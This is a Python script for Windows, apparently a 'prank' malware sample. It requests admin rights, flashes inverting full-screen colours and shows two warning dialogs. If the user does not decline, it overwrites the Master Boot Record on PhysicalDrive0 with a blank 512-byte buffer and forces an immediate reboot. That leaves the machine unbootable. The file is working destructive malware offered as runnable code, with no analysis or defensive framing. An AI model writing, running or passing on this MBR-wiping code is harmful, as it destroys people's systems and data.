import win32gui
import win32con
import win32api
import time
import random
import ctypes
from ctypes import wintypes
import sys

screen_width = win32api.GetSystemMetrics(0)
screen_height = win32api.GetSystemMetrics(1)

class FullScreenEffect:
    def __init__(self):
        self.hinstance = win32api.GetModuleHandle(None)

        wndClass = win32gui.WNDCLASS()
        wndClass.hInstance = self.hinstance
        wndClass.lpszClassName = "FullScreenEffectClass"
        wndClass.style = win32con.CS_HREDRAW | win32con.CS_VREDRAW
        wndClass.hCursor = win32gui.LoadCursor(0, win32con.IDC_ARROW)
        wndClass.lpfnWndProc = self.wndProc
        win32gui.RegisterClass(wndClass)

        self.hwnd = win32gui.CreateWindowEx(
            0,
            "FullScreenEffectClass",
            "Full Screen Effect",
            win32con.WS_POPUP | win32con.WS_VISIBLE,
            0, 0, screen_width, screen_height,
            0, 0, self.hinstance, None
        )

    def wndProc(self, hwnd, msg, wParam, lParam):
        if msg == win32con.WM_PAINT:
            hdc, paintStruct = win32gui.BeginPaint(hwnd)

            
            win32gui.EndPaint(hwnd, paintStruct)
        elif msg == win32con.WM_DESTROY:
            win32gui.PostQuitMessage(0)
        else:
            return win32gui.DefWindowProc(hwnd, msg, wParam, lParam)
        return 0

    def run_effect(self):
        for _ in range(100):
            bg_color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

            pattern_color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

            hdc = win32gui.GetDC(self.hwnd)

            win32gui.SetBkColor(hdc, bg_color)
            win32gui.SetTextColor(hdc, pattern_color)
            win32gui.BitBlt(hdc, 0, 0, screen_width, screen_height, hdc, 0, 0, win32con.SRCINVERT)

            win32gui.ReleaseDC(self.hwnd, hdc)

            time.sleep(0.1)

def run_as_admin():
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return True
    except Exception as e:
        print(f"Failed to run as admin: {e}")
        return False

if __name__ == '__main__':
    import sys
    from win32gui import *
    from win32ui import *
    from win32con import *
    from win32file import *
    import os, time
    if run_as_admin():
        pass
    else:
        
        pass

    
    full_screen_effect = FullScreenEffect()
    full_screen_effect.run_effect()
    time.sleep(10)
    if MessageBox("Warning! This software will overwrite your Master Boot Record!", "WARNING!", MB_ICONWARNING | MB_YESNO) == 7:
        sys.exit()
    if MessageBox("You Can Think Again", "LAST WARNING!", MB_ICONWARNING | MB_YESNO) == 7:
        sys.exit()
    if True:
        hDevice = CreateFileW("\\\\.\\PhysicalDrive0",
                            GENERIC_WRITE,
                            FILE_SHARE_READ | FILE_SHARE_DELETE,
                            None,
                            OPEN_EXISTING,
                            0,0
                            )
        WriteFile(hDevice,
                            AllocateReadBuffer(512),
                            None
                            )
        CloseHandle(hDevice)
time.sleep(2)
os.system("shutdown /r /t 0")